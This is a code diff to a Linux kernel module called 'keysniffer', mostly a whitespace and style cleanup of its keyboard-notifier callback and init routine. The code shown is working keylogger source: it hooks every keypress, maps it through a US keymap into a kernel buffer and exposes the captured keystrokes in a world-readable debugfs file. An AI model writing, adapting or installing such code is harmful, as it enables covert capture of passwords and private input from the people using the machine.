@@ -33,9 +33,9 @@ static struct dentry *file;
 static struct dentry *subdir;
 
 static ssize_t keys_read(struct file *filp,
-                char *buffer,
-                size_t len,
-                loff_t *offset);
+		char *buffer,
+		size_t len,
+		loff_t *offset);
 
 static int keysniffer_cb(struct notifier_block *nblock,
 		unsigned long code,
@@ -79,7 +79,7 @@ static const char *us_keymap[][2] = {
 	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"_PAUSE_", "_PAUSE_"},
 };
 
-static size_t buf_pos = 0;
+static size_t buf_pos;
 static char keys_buf[PAGE_SIZE << 4] = {0};
 
 const struct file_operations keys_fops = {
@@ -88,13 +88,13 @@ const struct file_operations keys_fops = {
 };
 
 static ssize_t keys_read(struct file *filp,
-                char *buffer,
-                size_t len,
-                loff_t *offset)
+		char *buffer,
+		size_t len,
+		loff_t *offset)
 {
-        return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
+	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
 }
- 
+
 static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
 };
@@ -109,36 +109,38 @@ int keysniffer_cb(struct notifier_block *nblock,
 	/* pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%d, value: 0x%x\n",
 		code, param->down, param->shift, param->value); */
 
-	if (param->down) {
-		if (param->value >= 0x1 && param->value <= 0x77) {
-			if (param->shift && us_keymap[param->value][1]) {
-				len = strlen(us_keymap[param->value][1]);
+	if (!(param->down))
+		return NOTIFY_OK;
 
-				if ((buf_pos + len) >= (PAGE_SIZE << 4)) {
-					memset(keys_buf, 0, PAGE_SIZE << 4);
-					buf_pos = 0;
-				}
+	if (param->value >= 0x1 && param->value <= 0x77) {
+		if (param->shift && us_keymap[param->value][1]) {
+			len = strlen(us_keymap[param->value][1]);
 
-				strncpy(keys_buf + buf_pos, us_keymap[param->value][1], len);
-				buf_pos += len;
-				keys_buf[buf_pos++] = '\n';
-
-				/* pr_debug("%s\n", us_keymap[param->value][1]); */
+			if ((buf_pos + len) >= (PAGE_SIZE << 4)) {
+				memset(keys_buf, 0, PAGE_SIZE << 4);
+				buf_pos = 0;
 			}
-			else if (us_keymap[param->value][0]) {
-				len = strlen(us_keymap[param->value][0]);
 
-				if ((buf_pos + len) >= (PAGE_SIZE << 4)) {
-					memset(keys_buf, 0, PAGE_SIZE << 4);
-					buf_pos = 0;
-				}
+			strncpy(keys_buf + buf_pos,
+					us_keymap[param->value][1], len);
+			buf_pos += len;
+			keys_buf[buf_pos++] = '\n';
 
-				strncpy(keys_buf + buf_pos, us_keymap[param->value][0], len);
-				buf_pos += len;
-				keys_buf[buf_pos++] = '\n';
+			/* pr_debug("%s\n", us_keymap[param->value][1]); */
+		} else if (us_keymap[param->value][0]) {
+			len = strlen(us_keymap[param->value][0]);
 
-				/* pr_debug("%s\n", us_keymap[param->value][0]); */
+			if ((buf_pos + len) >= (PAGE_SIZE << 4)) {
+				memset(keys_buf, 0, PAGE_SIZE << 4);
+				buf_pos = 0;
 			}
+
+			strncpy(keys_buf + buf_pos,
+					us_keymap[param->value][0], len);
+			buf_pos += len;
+			keys_buf[buf_pos++] = '\n';
+
+			/* pr_debug("%s\n", us_keymap[param->value][0]); */
 		}
 	}
 
@@ -147,17 +149,19 @@ int keysniffer_cb(struct notifier_block *nblock,
 
 static int __init keysniffer_init(void)
 {
-	subdir = debugfs_create_dir("kisni", NULL);
-        if (IS_ERR(subdir))
-                return PTR_ERR(subdir);
-        if (!subdir)
-                return -ENOENT;
+	buf_pos = 0;
 
-        file = debugfs_create_file("keys", S_IRUGO | S_IWUSR, subdir, NULL, &keys_fops);
-        if (!file) {
-                debugfs_remove_recursive(subdir);
-                return -ENOENT;
-        }
+	subdir = debugfs_create_dir("kisni", NULL);
+	if (IS_ERR(subdir))
+		return PTR_ERR(subdir);
+	if (!subdir)
+		return -ENOENT;
+
+	file = debugfs_create_file("keys", S_IRUGO | S_IWUSR, subdir, NULL, &keys_fops);
+	if (!file) {
+		debugfs_remove_recursive(subdir);
+		return -ENOENT;
+	}
 
 	register_keyboard_notifier(&keysniffer_blk);
 	return 0;
